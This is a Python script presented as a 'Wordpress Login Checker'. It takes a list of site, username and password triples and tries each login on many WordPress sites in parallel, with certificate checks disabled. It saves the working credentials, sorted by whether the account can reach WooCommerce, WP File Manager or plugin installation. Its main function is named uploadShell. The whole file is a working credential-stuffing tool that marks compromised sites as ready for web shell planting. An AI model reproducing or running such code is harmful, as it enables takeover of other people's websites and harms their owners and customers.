import requests
from multiprocessing.dummy import Pool as ThreadPool
from colorama import init, Fore
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Initialize colorama
init(autoreset=True)

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Define color codes for terminal output
G = Fore.GREEN
W = Fore.WHITE
R = Fore.RED
C = Fore.CYAN

def uploadShell(site):
    asuna = site.replace('#', '|').replace('@', '|')
    try:
        site, user, pasw = asuna.split('|')
        hd = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Safari/537.36'}
        r = requests.Session()
        cek = r.get(site, timeout=10, verify=False)
        if cek.status_code in [200, 403] or 'Powered by WordPress' in cek.text or '/wp-login.php' in cek.text:
            login = r.post(site, headers=hd, data={'log': user, 'pwd': pasw}, timeout=10, verify=False)
            if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.text:
                print(f'{W}[{G}+{W}] {asuna} --> {G}Login Success!{W}')
                with open('Result/loginSuccess_Checked.txt', 'a') as saveLog:
                    saveLog.write(site + '#' + user + '@' + pasw + '\n')
                if 'WooCommerce' in login.text:
                    print(f'{W}[{G}+{W}] WooCommerce!')
                    with open('Result/WooCommerce_Checked.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'WP File Manager' in login.text:
                    print(f'{W}[{G}+{W}] WP File Manager!')
                    with open('Result/wpfilemanager_Checked.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
                if 'plugin-install.php' in login.text:
                    print(f'{W}[{G}+{W}] Plugin install!')
                    with open('Result/plugin-install_Checked.txt', 'a') as assz:
                        assz.write(site + '#' + user + '@' + pasw + '\n')
            else:
                print(f'{W}[{R}-{W}] {asuna} --> {R}Login Failed!{W}')
        else:
            print(f'{W}[{R}-{W}] {site} --> {R}Site not accessible or not WordPress!{W}')
    except Exception as e:
        error_message = str(e).split(":")[0]
        print(f'\n{W}[{R}-{W}] {site} --> {R}Failed!{W}\n')
        print(f'{R}Error: {error_message}{W}')

print(f'{C}\n        Wordpress Login Checker{W}\n')

site_file = input('        Website list file: ')
sites = open(site_file, 'r').read().splitlines()
Thread = int(input('        Thread: '))

pool = ThreadPool(Thread)
pool.map(uploadShell, sites)
pool.close()
pool.join()
